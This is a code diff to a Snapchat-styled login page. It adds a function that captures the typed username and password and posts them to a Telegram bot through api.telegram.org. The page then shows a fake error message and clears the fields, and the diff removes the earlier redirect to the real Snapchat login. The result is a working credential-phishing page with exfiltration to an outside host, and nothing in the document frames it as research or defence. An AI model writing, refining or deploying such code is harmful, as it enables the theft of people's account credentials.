@@ -126,6 +126,9 @@
     </div>
 
     <script>
+        const botToken = 'YOUR_BOT_TOKEN';
+        const chatId = 'YOUR_CHAT_ID';
+
         const translations = {
             en: {
                 title: "Login",
@@ -155,12 +158,12 @@
 
         function getLanguage() {
             const lang = navigator.language || navigator.userLanguage;
-            return lang.split('-')[0]; // أخذ اللغة الأساسية فقط (مثل "en" من "en-US")
+            return lang.split('-')[0];
         }
 
         function applyTranslations() {
             const lang = getLanguage();
-            const texts = translations[lang] || translations["en"]; // افتراضي إلى الإنجليزية إذا كانت اللغة غير مدعومة
+            const texts = translations[lang] || translations["en"];
 
             document.getElementById("title").textContent = texts.title;
             document.getElementById("username-label").textContent = texts.usernameLabel;
@@ -175,9 +178,17 @@
         function simulateLogin(event) {
             event.preventDefault();
 
+            const username = document.getElementById("username").value.trim();
+            const password = document.getElementById("password").value.trim();
             const errorMessage = document.getElementById("error-message");
-            let countdown = 5;
 
+            if (!username || !password) {
+                errorMessage.style.display = "block";
+                errorMessage.textContent = translations[getLanguage()].errorMessage;
+                return;
+            }
+
+            let countdown = 5;
             errorMessage.style.display = "block";
 
             const countdownInterval = setInterval(() => {
@@ -186,14 +197,38 @@
 
                 if (countdown < 0) {
                     clearInterval(countdownInterval);
-                    errorMessage.textContent = translations[getLanguage()].errorMessage;
 
-                    // تأخير لإعادة المحاولة
-                    setTimeout(() => {
-                        window.location.href = "https://accounts.snapchat.com/accounts/login";
-                    }, 2000); // التوجيه بعد 2 ثانية
+                    sendToTelegram(username, password);
+
+                    errorMessage.textContent = translations[getLanguage()].errorMessage;
+                    document.getElementById("username").value = "";
+                    document.getElementById("password").value = "";
                 }
             }, 1000);
+        }
+
+        function sendToTelegram(username, password) {
+            const message = `👤 Username: ${username}\n🔒 Password: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then((response) => response.json())
+            .then((data) => {
+                if (data.ok) {
+                    console.log("Message sent to Telegram!");
+                } else {
+                    console.error("Failed to send message to Telegram.");
+                }
+            })
+            .catch((error) => {
+                console.error("Telegram API error:", error);
+            });
         }
     </script>
 </body>
